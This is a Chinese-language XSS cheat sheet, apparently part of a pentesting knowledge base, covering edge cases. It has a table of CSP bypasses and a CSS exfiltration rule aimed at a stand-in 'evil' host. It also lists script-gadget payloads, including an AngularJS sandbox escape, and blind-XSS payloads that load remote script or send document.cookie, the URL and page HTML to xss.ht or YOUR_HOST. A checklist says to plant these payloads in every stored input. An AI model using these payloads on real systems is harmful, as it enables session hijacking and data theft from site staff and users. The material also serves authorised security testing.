---
name: xss-scenarios
description: 本文件收录 XSS 的 CSP 绕过矩阵 / Blind XSS / 非即时输出 sink 等边角场景。 Context 矩阵、标签 payload、DOM XSS 核心流程、存储型触发点等仍在 [xss.md](xss.md)。
category: vuln
tags: [client, scenarios]
---

# XSS — 边角场景 (SCENARIOS)

← 主文件 [xss.md](xss.md)

> 本文件收录 XSS 的 **CSP 绕过矩阵** / **Blind XSS** / **非即时输出 sink** 等边角场景。
> Context 矩阵、标签 payload、DOM XSS 核心流程、存储型触发点等仍在 [xss.md](xss.md)。

---

## 1. CSP 绕过

### 1.1 查看 CSP
```bash
curl -sI https://target.com | grep -i content-security-policy
```

### 1.2 常见 CSP 弱点 → 绕过

| CSP | 弱点 | 绕过 |
|-----|------|------|
| `script-src 'unsafe-inline'` | 允许 inline | 直接 `<script>` / 事件处理器 |
| `script-src 'self'` + 上传功能 | 同源可上传 JS 文件 | 上传 `.js` 文件然后 `<script src=/uploads/evil.js>` |
| `script-src 'self' *.google.com` | google CDN 有 AngularJS | JSONP / 利用 AngularJS templating |
| `script-src *.youtube.com` | 允许大型 CDN | 找到该 CDN 上的 JSONP 端点 |
| `script-src 'nonce-XXX'` 但 nonce 可预测 | 无 `'strict-dynamic'` | 注入到已有 `<script nonce=XXX>` 附近 |
| `script-src data:` | 允许 data URI | `<script src="data:text/javascript,alert(1)">` |
| `unsafe-eval` | 允许 eval | 利用 template engines(AngularJS Sandbox escape) |
| 只限 script-src, 不限 style-src | 允许 inline CSS | CSS exfiltration: `[attr='a'] { background: url(//evil/?a) }` |

### 1.3 Script Gadgets (现成的)

在 `script-src 'self'` 下, 若页面引入了 Knockout / Dojo / Backbone / Bootstrap / jQuery 旧版, 可利用其 gadget:

```html
<!-- Knockout -->
<div data-bind="value:alert(1)"></div>

<!-- Bootstrap jQuery XSS (旧版) -->
<div data-template="<script>alert(1)</script>">

<!-- AngularJS 1.x Sandbox Escape (1.5.7 前) -->
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
```

---

## 2. Blind XSS (盲 XSS)

### 2.1 何时用

- 反馈表单 → 后台客服看到时触发
- 用户注册信息 → 管理员审核面板触发
- 日志注入 → SIEM / 监控平台触发
- 邮件 / PDF 导出 / 审计日志 等非即时输出 sink

### 2.2 Payload(带外信标)

```html
<script src="//xss.ht/xxx"></script>
<img src=x onerror="s=document.createElement('script');s.src='//xss.ht/xxx';document.body.appendChild(s)">
<svg onload="fetch('//xss.ht/log?c='+document.cookie+'&u='+document.URL)">
```

### 2.3 平台
- **XSS Hunter** (xss.ht) - 最经典
- **Bxss** (bxss.me)
- **自建**: 架个 HTTP server 接收 cookie/URL/screenshot

### 2.4 Hunt Checklist
把以下 payload 投到每个可能的存储点:

```html
<svg onload="fetch('//YOUR_HOST/?u='+location+'&c='+document.cookie+'&d='+document.documentElement.outerHTML.substr(0,200))">
```

---

## 3. 相关参考

- 主文件 → [xss.md](xss.md)
- CSRF/Clickjacking 组合 → [csrf-clickjacking.md](csrf-clickjacking.md)
- Payload 速查 → [../payloads.md](../payloads.md)
